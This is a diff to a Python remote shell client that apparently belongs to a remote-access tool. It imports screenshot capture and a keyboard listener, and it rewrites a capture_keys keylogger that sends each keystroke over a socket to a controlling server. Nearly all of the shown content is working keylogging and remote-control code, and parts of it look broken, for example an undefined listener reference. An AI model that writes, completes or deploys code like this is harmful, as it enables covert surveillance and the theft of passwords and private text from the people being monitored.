@@ -1,5 +1,4 @@
 #!/usr/bin/python
-# Remote Shell Client
 
 # Description:
 # This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
@@ -15,7 +14,7 @@ import subprocess
 import os
 import platform
 from PIL import ImageGrab
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
 
 
 class RemoteControl:
@@ -28,6 +27,54 @@ class RemoteControl:
         self.connection_died = 0
         self.timeout = 0
         self.json_receive_timeout = 0
+
+    # Define a dictionary to map VK codes to characters
+
+    def capture_keys(self, key):
+        if self.keylogger_active:
+            try:
+                # [*] check 'vk': 65437 bug
+                key_attributes = dir(key)
+                for attributes in key_attributes:
+                    if not callable(getattr(key, attributes)):
+                        pr = getattr(key, attributes)
+                        if isinstance(pr, dict):
+                            print("\n", pr)
+
+                # Check if the key represents the backspace key
+                if key == Key.backspace:
+                    char = "<- "
+                elif key == Key.space:
+                    char = " "
+                elif key == Key.enter:
+                    char = "\n"
+                elif key.vk == 97:
+                    char = "1"
+                elif key.vk == 98:
+                    char = "2"
+                elif key.vk == 99:
+                    char = "3"
+                elif key.vk == 100:
+                    char = "4"
+                elif key.vk == 101:
+                    char = "5"
+                elif key.vk == 102:
+                    char = "6"
+                elif key.vk == 103:
+                    char = "7"
+                elif key.vk == 104:
+                    char = "8"
+                elif key.vk == 105:
+                    char = "9"
+                else:
+                    char = getattr(key, 'char')
+                if char is not None:
+                    print(char, end='', flush=True)
+                self.server_socket.send(char.encode())
+            except Exception as e_cap_key:
+                print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
+        else:
+            listener.stop()
 
     def connect_to_server(self):
         while True:
@@ -42,63 +89,6 @@ class RemoteControl:
             except Exception as e_connect:
                 print(f'[!] An error occurred: {e_connect}')
                 time.sleep(10)
-
-    def capture_keys(self, key):
-        try:
-            # [*] check 'vk': 65437 bug
-            # key_attributes = dir(key)
-            # for attributes in key_attributes:
-            #     if not callable(getattr(key, attributes)):
-            #         pr = getattr(key, attributes)
-            #         if isinstance(pr, dict):
-            #             print("\n", pr)
-            if key == 'space':
-                char = " "
-            elif key == 'enter':
-                char = "\n"
-            elif key == 'backspace':
-                char = "<- "
-            elif hasattr(key, 'char'):
-                char = key.char
-                # There's a bug when pressing numpy 5 on linux systems
-                # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
-                if key.vk == 65437:
-                    char = "5"
-            else:
-                char = getattr(key, 'char')
-            print(char, end='', flush=True)
-            self.server_socket.send(char.encode())
-        except Exception as e_cap_key:
-            print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
-        if self.keylogger_active:
-            try:
-                # [*] check 'vk': 65437 bug
-                # key_attributes = dir(key)
-                # for attributes in key_attributes:
-                #     if not callable(getattr(key, attributes)):
-                #         pr = getattr(key, attributes)
-                #         if isinstance(pr, dict):
-                #             print("\n", pr)
-                if key == key.space:
-                    char = " "
-                elif key == key.enter:
-                    char = "\n"
-                elif key == key.backspace:
-                    char = "<- "
-                elif hasattr(key, 'char'):
-                    char = key.char
-                    # There's a bug when pressing numpy 5 on linux systems
-                    # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
-                    if key.vk == 65437:
-                        char = "5"
-                else:
-                    char = getattr(key, 'char')
-                print(char, end='', flush=True)
-                self.server_socket.send(char.encode())
-            except Exception as e_cap_key:
-                print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
-        else:
-            listener.stop()
 
     def send_data_as_json(self, data):
         json_data = json.dumps(data)
